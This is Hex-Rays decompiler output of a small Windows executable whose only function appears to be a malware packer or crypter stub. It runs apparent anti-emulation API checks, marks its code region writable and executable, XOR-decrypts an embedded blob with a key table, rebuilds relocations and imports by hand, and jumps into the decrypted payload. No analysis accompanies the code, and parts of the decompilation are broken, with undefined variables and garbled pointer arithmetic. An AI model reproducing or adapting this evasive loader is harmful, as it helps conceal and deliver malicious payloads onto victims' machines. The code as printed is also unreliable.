/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// DWORD __usercall start@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<ebp>, int a4@<edi>, int a5@<esi>);
// BOOL __stdcall AreAllAccessesGranted(DWORD GrantedAccess, DWORD DesiredAccess);
// DWORD __stdcall AddUsersToEncryptedFile(LPCWSTR lpFileName, PENCRYPTION_CERTIFICATE_LIST pEncryptionCertificates);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);

//-------------------------------------------------------------------------
// Data declarations

char byte_4015C8[] = { '=' }; // weak
_UNKNOWN loc_401DA8; // weak
int dword_4028C8[206] =
{
  -1236402873,
  -1001552139,
  -1392661765,
  -840395803,
  -1922788218,
  -285705398,
  -1117118375,
  1956982888,
  373784091,
  1710651790,
  994447062,
  -1746525367,
  734204098,
  -30101041,
  -2005299997,
  -900051181,
  -1324121746,
  -1358630032,
  -1771132576,
  -1864841094,
  2144176550,
  607119974,
  1001437505,
  1975353154,
  1976376816,
  48654780,
  776746817,
  531208455,
  -1100995416,
  -2090733178,
  1099270129,
  -1880505144,
  -41238629,
  -1479499339,
  -957441794,
  -2078237279,
  -409112047,
  -1266210309,
  2100115955,
  534738841,
  1799780348,
  889782292,
  -1688851394,
  654777366,
  -234373641,
  -2072215301,
  -944028940,
  -1121415858,
  -1555431586,
  -1708350171,
  -1668365249,
  1209894160,
  331926919,
  62820014,
  2094626392,
  2091521182,
  195846388,
  379654046,
  648520191,
  -2025316930,
  -1173108515,
  2013511310,
  -1236402873,
  -1001552347,
  -1640327087,
  -15294193,
  -1104762975,
  -578336739,
  -1900407864,
  1199047614,
  632704509,
  1371819398,
  262027928,
  -1577118047,
  499000999,
  -925006008,
  -1097942509,
  -45647869,
  -2044348851,
  -1739471795,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
const WCHAR FileName = 0u; // idb
char byte_404000[4096] =
{
  '&',
  'µ',
  '\x16',
  'Ý',
  'T',
  'Á',
  '\b',
  'ª',
  '\x0E',
  'Ÿ',
  '1',
  '†',
  'o',
  '1',
  '7',
  '¶',
  '.',
  '\x8D',
  'Ø',
  '\x17',
  'M',
  'X',
  'ƒ',
  '*',
  '\x1E',
  '.',
  '“',
  'è',
  '×',
  'm',
  'Ý',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb


//----- (00401000) --------------------------------------------------------
DWORD __usercall start@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<ebp>, int a4@<edi>, int a5@<esi>)
{
  int v5; // esi
  int v6; // edi
  unsigned int v7; // ebx
  DWORD result; // eax
  int v9; // eax
  unsigned int v10; // ecx
  char *v11; // ebp
  int *v12; // edx
  char *v13; // edi
  char *v14; // esi
  char *v15; // eax
  _WORD *v16; // ecx
  char *v17; // edi
  char *v18; // esi
  HMODULE v19; // eax
  int v20; // ecx
  int *v21; // ebp
  FARPROC *v22; // edi
  int v23; // ecx
  FARPROC v24; // eax
  int v25; // edx
  char *v26; // edx
  bool v27; // zf
  DWORD flOldProtect; // [esp+4h] [ebp-10h] BYREF
  char *v33; // [esp+8h] [ebp-Ch]
  char *v34; // [esp+Ch] [ebp-8h]
  HMODULE v35; // [esp+10h] [ebp-4h]

  v5 = 0;
  v6 = 31;
  v7 = a1 + 4 * a2;
  result = AddUsersToEncryptedFile(&FileName, 0);
  if ( result )
  {
    if ( !AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
      v6 = 17;
    v9 = VirtualProtect(start, 0x3000u, 0x40u, &flOldProtect);
    v10 = 0;
    while ( 1 )
    {
      if ( v5 == v6 )
        v5 = 0;
      v9 *= 2;
      byte_4015C8[v10] ^= byte_404000[v5] ^ 0x90;
      v7 = v9 + 4 * v7;
      ++v10;
      ++v5;
      if ( v10 >= 0x1440 )
      {
        v11 = &byte_4015C8[-640];
        v12 = dword_4028C8;
        v33 = &byte_4015C8[-640];
        v13 = 0;
        v14 = &byte_4015C8[-268436096];
        v34 = 0;
        while ( 1 )
        {
          v15 = (char *)((unsigned int)(v12[1] - 8) >> 1);
          v16 = v12 + 2;
          if ( v15 )
          {
            v7 = (unsigned int)(v12[1] - 8) >> 1;
            do
            {
              LOWORD(v15) = *v16 & 0xF000;
              if ( (_WORD)v15 == 12288 )
              {
                v13 = &v15[4 * (_DWORD)v13];
                v15 = &v11[*v12 + (*v16 & 0xFFF)];
                *(_DWORD *)v15 += v14;
              }
              ++v16;
              --v7;
            }
            while ( v7 );
            v13 = v34;
          }
          v13 += v12[1];
          v34 = v13;
          v7 *= 3;
          v12 = (int *)((char *)v12 + v12[1]);
          if ( (unsigned int)v13 >= 0xE4 )
          {
            v17 = &byte_4015C8[2796];
            v34 = &byte_4015C8[2796];
            v18 = (char *)v12 + 2 * (_DWORD)v14;
            if ( *(_DWORD *)&byte_4015C8[2812] )
            {
              do
              {
                v19 = LoadLibraryA(&v11[*((_DWORD *)v17 + 3)]);
                v35 = v19;
                if ( v19 )
                {
                  v20 = *(_DWORD *)v17;
                  if ( !*(_DWORD *)v17 )
                    v20 = *((_DWORD *)v17 + 4);
                  v21 = (int *)&v11[v20];
                  v7 = (unsigned int)v19 + 2 * v7;
                  v22 = (FARPROC *)&v33[*((_DWORD *)v17 + 4)];
                  if ( *v21 )
                  {
                    while ( 1 )
                    {
                      v23 = *v21;
                      if ( *v21 >= 0 )
                      {
                        v24 = GetProcAddress(v19, &v33[v23 + 2]);
                      }
                      else
                      {
                        v24 = GetProcAddress(v19, (LPCSTR)(unsigned __int16)v23);
                        v26 = &v18[8 * v25];
                      }
                      *v22 = v24;
                      ++v21;
                      v18 = &v26[(_DWORD)v18];
                      ++v22;
                      if ( !*v21 )
                        break;
                      v19 = v35;
                    }
                  }
                  v11 = v33;
                  v17 = v34;
                }
                v17 += 20;
                v27 = *((_DWORD *)v17 + 4) == 0;
                v34 = v17;
              }
              while ( !v27 );
            }
            ((void (__cdecl *)(int, int, int, int))loc_401DA8)(a4, a5, a3, a2);
            ExitProcess(0);
          }
        }
      }
    }
  }
  return result;
}
// 401169: variable 'v25' is possibly undefined
// 401183: variable 'v26' is possibly undefined
// 4028C8: using guessed type int dword_4028C8[206];

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
